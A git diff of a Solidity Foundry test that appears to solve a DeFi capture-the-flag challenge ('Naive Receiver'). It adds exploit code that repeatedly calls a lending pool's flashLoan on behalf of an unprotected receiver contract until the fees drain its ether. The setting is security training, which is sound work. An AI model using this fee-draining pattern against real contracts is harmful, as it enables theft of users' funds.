@@ -33,9 +33,7 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
-        flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
-        );
+        flashLoanReceiver = new FlashLoanReceiver(payable(naiveReceiverLenderPool));
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
@@ -48,6 +46,18 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 100 ether);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
